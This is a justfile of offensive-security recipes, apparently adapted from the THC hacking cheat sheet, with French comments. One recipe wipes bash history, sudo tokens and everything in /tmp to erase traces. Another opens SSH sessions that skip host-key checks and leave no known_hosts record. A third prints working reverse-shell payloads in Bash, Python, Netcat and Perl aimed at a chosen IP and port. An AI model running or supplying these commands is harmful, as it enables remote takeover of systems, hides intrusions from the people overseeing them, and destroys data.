# THC Tips & Tricks for Blackfin
# Source: https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet

thc-help:
    @echo "🏴‍☠️ THC Hacks available:"
    @echo "  just clean-traces       - Clear history, logs, and temp files"
    @echo "  just ssh-stealth <host> - SSH without writing to known_hosts or history"
    @echo "  just gen-revshell <ip> <port> - Generate common reverse shell payloads"

# Nettoyage des traces basique (Stealth)
clean-traces:
    @echo "🧹 Cleaning Bash History..."
    history -c && history -w
    @echo "🧹 Cleaning Sudo tokens..."
    sudo -k
    @echo "🧹 Cleaning Temp files..."
    rm -rf /tmp/* 2>/dev/null || true
    @echo "✅ Traces cleaned (Basic)."

# SSH Furtif (Ne stocke rien localement)
ssh-stealth host="":
    #!/usr/bin/env bash
    if [ -z "{{host}}" ]; then
        echo "Usage: just ssh-stealth user@target"
        exit 1
    fi
    echo "🕵️ Connecting to {{host}} explicitly ignoring known_hosts..."
    ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o LogLevel=ERROR "{{host}}"

# Générateur de Reverse Shells (Aide-mémoire)
gen-revshell ip port:
    @echo "🔥 Reverse Shell Payloads for {{ip}}:{{port}}"
    @echo ""
    @echo "[Bash]"
    @echo "bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1"
    @echo ""
    @echo "[Python]"
    @echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ip}}\",{{port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    @echo ""
    @echo "[Netcat]"
    @echo "nc -e /bin/sh {{ip}} {{port}}"
    @echo ""
    @echo "[Perl]"
    @echo "perl -e 'use Socket;\$i=\"{{ip}}\";\$p={{port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\"&S\");open(STDOUT,\"&S\");open(STDERR,\"&S\");exec(\"/bin/sh -i\");};'"
